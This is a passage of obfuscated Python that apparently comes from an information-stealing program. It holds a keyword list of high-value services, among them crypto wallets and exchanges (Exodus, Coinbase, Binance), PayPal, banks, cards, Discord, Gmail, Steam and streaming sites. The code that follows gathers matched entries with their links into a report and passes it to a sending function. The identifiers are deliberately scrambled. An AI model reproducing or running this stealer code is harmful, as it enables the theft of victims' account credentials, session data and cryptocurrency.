,'[uber](https://uber.com)','[netflix](https://netflix.com)']#line:327:r=['mail','nft',B9,'[exodus](https://exodus.com)','[coinbase](https://coinbase.com)','[github](https://github.com)','[stake](https://stake.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)',BA,'[uber](https://uber.com)','[netflix](https://netflix.com)']
s =[]#line:328:s=[]
t =[]#line:329:t=[]
Ak ()#line:330:Ak()
O =A7 (W )#line:331:O=A7(W)
if not O :#line:332:if not O:
	Ap =Ao ()#line:333:Ap=Ao()
	for Aq in Ap :Aq .join ()#line:334:for Aq in Ap:Aq.join()
	time .sleep (0.2 );d ='\n'#line:335:time.sleep(0.2);d='\n'
	for u in X :#line:336:for u in X:
		if Q (u [2 ])!=0 :#line:337:if Q(u[2])!=0:
			Ar =u [1 ];As =u [2 ];d +=f"• {Ar}\n"#line:338:Ar=u[1];As=u[2];d+=f"• {Ar}\n"
			for AD in As :AE =AD [0 ].split (C );At =AE [Q (AE )-1 ];Au =AD [1 ];d +=f"... [{At}]({Au})\n"#line:339:for AD in As:AE=AD[0].split(C);At=AE[Q(AE)-1];Au=AD[1];d+=f"... [{At}]({Au})\n"
			d +='\n'#line:340:d+='\n'
	p (B0 ,d )
